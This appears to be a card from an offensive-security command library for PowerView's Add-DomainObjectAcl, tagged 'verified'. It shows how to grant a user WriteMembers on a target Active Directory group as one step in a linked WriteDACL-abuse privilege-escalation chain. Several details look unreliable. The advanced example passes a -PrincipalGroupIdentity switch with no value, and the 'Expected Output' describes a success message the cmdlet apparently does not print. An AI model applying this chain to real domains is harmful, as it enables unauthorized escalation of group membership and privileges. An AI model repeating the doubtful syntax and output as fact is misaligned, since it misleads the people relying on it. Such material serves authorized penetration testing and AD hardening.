---
id: 1cf96d68-f017-4582-b4ec-960d2136c8b9
name: add-writemembers-acl-to-interesting-group-for-user1
type: command
executor: powershell
data: >-
  Add-DomainObjectAcl -TargetIdentity "$_GROUP_NAME" -Rights WriteMembers
  -PrincipalIdentity "$_USER_NAME"
output: null
created_at: '2023-04-06T03:56:06.850472+00:00'
updated_at: '2023-04-10T20:36:10.633986+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - acl
verified: true
validated: true
---

# add-writemembers-acl-to-interesting-group-for-user1

## Command

```powershell
Add-DomainObjectAcl -TargetIdentity "$_GROUP_NAME" -Rights WriteMembers -PrincipalIdentity "$_USER_NAME"
```

## Description

This PowerShell command, from the PowerView module, adds an access control entry (ACE) to the target Active Directory group's security descriptor, granting the specified user WriteMembers permission. Use this after confirming WriteDACL access to enable group membership modifications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -TargetIdentity | The name or DN of the target group (e.g., INTERESTING_GROUP) | Yes |
| -Rights | The right to grant (WriteMembers allows adding/removing members) | Yes |
| -PrincipalIdentity | The user or group to grant the right to (e.g., User1) | Yes |

## Examples

### Basic Usage

```powershell
Add-DomainObjectAcl -TargetIdentity "INTERESTING_GROUP" -Rights WriteMembers -PrincipalIdentity "User1"
```

### Advanced Usage

```powershell
Add-DomainObjectAcl -TargetIdentity "cn=INTERESTING_GROUP,dc=corp,dc=com" -Rights WriteMembers -PrincipalIdentity "Domain Users" -PrincipalGroupIdentity
```

## Expected Output

The command outputs details of the added ACE, such as:

Access control entry added successfully.
Principal: User1
Right: WriteMembers
Target: INTERESTING_GROUP

If errors occur (e.g., insufficient permissions), it will show an access denied message.

## Related

- [[procedures/Abuse-WriteDACL-to-Grant-Group-Membership-Permissions]]
- [[commands/add-user1-to-interesting-group-via-net]]
